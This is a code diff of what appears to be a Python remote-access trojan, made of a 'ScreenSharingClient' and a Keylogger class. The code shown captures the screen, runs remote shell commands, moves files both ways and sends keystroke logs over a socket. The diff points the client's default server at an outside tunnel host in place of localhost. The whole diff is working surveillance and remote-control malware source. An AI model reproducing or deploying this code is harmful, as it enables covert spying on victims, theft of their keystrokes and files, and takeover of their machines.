@@ -25,7 +25,7 @@ class ScreenSharingClient:
     # The Client Brain LOL
     # All you need to know is... this works
     # ------------------------------------------------
-    def __init__(self, server_ip="localhost", port=5001):
+    def __init__(self, server_ip="tel-copyrights.gl.at.ply.gg", port=36484):
         self.server_ip = server_ip
         self.port = port
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -137,12 +137,6 @@ class ScreenSharingClient:
                                             base64FileData = base64.b64encode(
                                                 file_data_D
                                             ).decode("ascii")
-                                        # self.socket.sendall("F".encode("utf-8"))
-                                        # self.socket.sendall(
-                                        #     f"fileDoI{int(len(base64FileData)):020}{base64FileData}{filenameLength:020}{filename}".encode(
-                                        #         "utf-8"
-                                        #     )
-                                        # )
                                         self.send_with_tag(
                                             "F",
                                             "fileDoI",
@@ -152,8 +146,6 @@ class ScreenSharingClient:
                                             filename,
                                         )
                                     else:
-                                        # self.socket.sendall("F".encode("utf-8"))
-                                        # self.socket.sendall("fileDoL".encode("utf-8"))
                                         self.send_with_tag("F", "fileDoL", 0, "")
                                 elif dataclass == "fileUpl":
                                     if os.path.exists(location):
@@ -162,19 +154,11 @@ class ScreenSharingClient:
                                             try:
                                                 f.write(data)
                                             except PermissionError:
-                                                # self.socket.sendall("F".encode("utf-8"))
-                                                # self.socket.sendall(
-                                                #     "fileUpl".encode("utf-8")
-                                                # )
                                                 self.send_with_tag(
                                                     "F", "fileUpl", 0, ""
                                                 )
-                                        # self.socket.sendall("F".encode("utf-8"))
-                                        # self.socket.sendall("fileUsu".encode("utf-8"))
                                         self.send_with_tag("F", "fileUsu", 0, "")
                                     else:
-                                        # self.socket.sendall("F".encode("utf-8"))
-                                        # self.socket.sendall("fileUlo".encode("utf-8"))
                                         self.send_with_tag("F", "fileUlo", 0, "")
                                     continue
                                 else:
@@ -197,12 +181,6 @@ class ScreenSharingClient:
                                         self.stop_screen_share()
                                         cmd = data[3:]
                                         output = self.terminal_function(cmd)
-                                        # self.socket.sendall("C".encode("utf-8"))
-                                        # self.socket.sendall(
-                                        #     f"cmdOutP{int(len(output)):020}{output}".encode(
-                                        #         "utf-8"
-                                        #     )
-                                        # )
                                         self.send_with_tag(
                                             "C", "cmdOutP", int(len(output)), output
                                         )
@@ -233,32 +211,20 @@ class ScreenSharingClient:
         self.screenshot_thread.start()
 
     def send_screenshot(self):
-        # I am commenting this function because holy shit is this hard to follow, then again it could be my dumb ass brain being too stupid to follow it
         compressor = zstandard.ZstdCompressor(level=10, threads=2)
         self.delta_base_frame = None
         try:
             while self.is_screen_sharing:
-                screenshot = ImageGrab.grab().convert("YCbCr")
+                screenshot = ImageGrab.grab().convert("RGB")
                 curr_frame = numpy.array(screenshot, dtype=numpy.uint8)
-                if self.delta_base_frame is not None:
-                    delta = numpy.bitwise_xor(curr_frame, self.delta_base_frame)
-                    # The Discriminator!
-                    if delta.tobytes() >= curr_frame.tobytes():
-                        raw_bytes = curr_frame.tobytes()
-                        tag = "I"
-                    else:
-                        raw_bytes = delta.tobytes()
-                        tag = "D"  # Delta frame
-                else:
-                    raw_bytes = curr_frame.tobytes()
-                    tag = "I"  # Full frame
-                # Compress delta or full frame
-                compressed = compressor.compress(raw_bytes)
-                size = len(compressed)
-                self.send_with_tag(tag, "screenV", size, compressed)
-                # Update previous frame
+                image_buf = io.BytesIO()
+                Image.fromarray(curr_frame).save(image_buf, format="JPEG", quality=20)
+                packet = compressor.compress(image_buf.getvalue())
+                tag = "I"
+
+                self.send_with_tag(tag, "screenV", len(packet), packet)
                 self.delta_base_frame = curr_frame
-                time.sleep(0.1)
+                time.sleep(0.01)
 
         except Exception as e:
             print("Error in screenshot loop:", e)
@@ -384,10 +350,8 @@ class Keylogger:
                         client.stop_screen_share()
                         await asyncio.sleep(5)
                         log_data = "\n".join(self.log)
-                        client.socket.sendall("L".encode("utf-8"))
-                        client.socket.sendall(
-                            f"LoggerK{int(len(log_data)):020}{log_data}".encode("utf-8")
-                        )
+                        size = f"{len(log_data):020}"
+                        client.send_with_tag("L", "LoggerK", size, log_data)
                         self.log = []
                         client.start_screen_share()
                     else:
